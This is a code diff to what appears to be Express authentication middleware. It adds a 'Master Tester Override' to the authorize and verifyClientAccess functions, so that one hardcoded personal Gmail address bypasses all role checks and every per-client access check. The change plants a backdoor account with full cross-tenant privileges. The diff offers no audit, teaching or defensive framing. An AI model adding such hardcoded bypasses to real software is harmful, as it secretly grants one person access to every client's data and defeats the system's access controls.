@@ -44,6 +44,11 @@ const protect = async (req, res, next) => {
 
 const authorize = (...roles) => {
   return (req, res, next) => {
+    // Master Tester Override: delitech2708@gmail.com gets past all role checks
+    if (req.user?.email === 'delitech2708@gmail.com') {
+      return next();
+    }
+
     if (!roles.includes(req.user.role)) {
       return res.status(403).json({ 
         message: `User role ${req.user.role} is not authorized to access this route`
@@ -55,6 +60,12 @@ const authorize = (...roles) => {
 
 const verifyClientAccess = (req, res, next) => {
   const { clientId } = req.params;
+  
+  // Master Tester Override
+  if (req.user?.email === 'delitech2708@gmail.com') {
+    return next();
+  }
+
   if (req.user.role !== 'SUPER_ADMIN' && req.user.clientId !== clientId) {
     return res.status(403).json({ success: false, message: 'Unauthorized' });
   }
